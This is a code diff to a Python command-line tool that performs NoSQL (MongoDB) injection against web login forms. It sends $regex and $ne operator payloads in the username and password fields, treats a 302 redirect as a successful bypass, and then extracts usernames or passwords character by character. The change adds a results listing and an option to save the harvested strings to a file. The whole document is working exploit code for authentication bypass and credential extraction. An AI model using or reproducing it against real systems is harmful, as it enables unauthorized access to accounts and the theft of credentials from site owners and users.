@@ -33,6 +33,7 @@ class CodeInjector:
 
     def test_injection(self):
         if self.r is 'POST':
+
             if self.inject(test=True):
                 stdout.write(bc.OKGREEN + f'[+] Host {self.h} is injectable with "{self.up}" and "{self.pp}" parameters'+'\n'+bc.DEFAULT)
                 return True
@@ -42,13 +43,12 @@ class CodeInjector:
 
     def build_payload(self, test=False, char=''):
 
-        injection_payloads = {f'{self.up}'  : {self.up + '[$regex]' : "^" + char + ".*", self.pp + '[$ne]' : '' + ',' + self.ot},
-                              f'{self.pp}'  : {self.up + '[$ne]' : '', self.pp + '[$regex]' : "^" + char + ".*"',' + ',' + self.ot},
-                              'test_pay' : {self.up + '[$ne]' : '', self.pp + '[$ne]' : '' + ',' + self.ot}}
+        injection_payloads = {f"{self.up}"  : {self.up + "[$regex]" : "^" + char + ".*", self.pp + "[$ne]" : "" + "," + self.ot},
+                              f"{self.pp}"  : {self.pp + "[$regex]" : "^" + char + ".*", self.up + "[$ne]" : "" + "," + self.ot},
+                              "test_pay" : {self.up + "[$ne]" : "", self.pp + "[$ne]" : "" + "," + self.ot}}
         if test:
             return injection_payloads['test_pay']
         if not test:
-            print(injection_payloads[self.tg])
             return injection_payloads[self.tg]
 
     def inject(self, test=False):
@@ -60,31 +60,40 @@ class CodeInjector:
                 if test_query.status_code == 302:
                     return True
         else:
-            matches = []
+            ml = []
+            m = ''
             if self.r is 'POST':
                 for c in string.printable:
-                    print(c)
                     if c in badchar:
                         continue
                     payload = self.build_payload(char=c)
                     query = post(self.h, data=payload, allow_redirects=False, verify=False)
                     if query.status_code == 302:
-                        stdout.write(bc.OKBLUE + f'[+] Found matching character "{c}"\n'
-                                   + bc.DEFAULT + '[*] Enumerating rest of string...\n')
-                        matches.append(c)
+                        stdout.write(f'[*] Starting character "{c}"\n'
+                                      '[*] Enumerating rest of string...\n')
+                        m += c
                         while True:
                             for cc in string.printable:
                                 if cc in badchar:
                                     continue
-                                print(''.join(matches) + cc)
-                                payload = self.build_payload(char=(''.join(matches) + cc))
+                                payload = self.build_payload(char=(m + cc))
                                 query = post(self.h, data=payload, allow_redirects=False, verify=False)
                                 if query.status_code == 302:
-                                    stdout.write(bc.OKBLUE + f'[+] Found matching starting character "{cc}"\n')
-                                    matches.append(cc)
+                                    stdout.write(f'[+] Match: "{cc}"\n')
+                                    m += cc
                                     break
                             if query.status_code != 302:
-                                return ''.join(matches)
+                                ml.append(m)
+                                m = ''
+                                break
+
+            stdout.write('[*] Results:\n'
+                        f'[+] Host: {self.h}\n'
+                        f'[+] {self.tg} matches:\n')
+            for s in ml:
+                stdout.write(f'[*] {s}\n')
+
+            return ml
 
 
 def show_banner():
@@ -109,18 +118,28 @@ show_banner()
                     help='List of other parameters contained in the URL separated by commas',metavar='<key:val>')
 @click.option('-t','--target',show_default=True,
                     help='Specify parameter to enumerate',metavar='<str>')
+@click.option('-o','--output',type=click.Path(), metavar='<path>',
+                    help='Output results to .txt file for use with other tools')
 @click.argument('host')
 def main(
     request='',
     userp='',
     passwdp='',
-    otherparam=[],
+    otherparam='',
     target='',
-    host=''):
+    host='',
+    output=''):
     injector = CodeInjector(host, request, userp, passwdp, target, otherparam)
     stdout.write(f"[*] Target: {host}\n[*] Request type: {request}\n[*] Params: {userp} {passwdp} {otherparam}\n[*] Injection point: {target}\n")
     if injector.test_injection():
-        injector.inject()
+        results = injector.inject()
+        if output:
+            write(results, output)
+
+def write(results, output):
+    with open(output, 'a') as f:
+        for r in results:
+            f.write(r+'\n')
 
 if __name__ == '__main__':
     main()
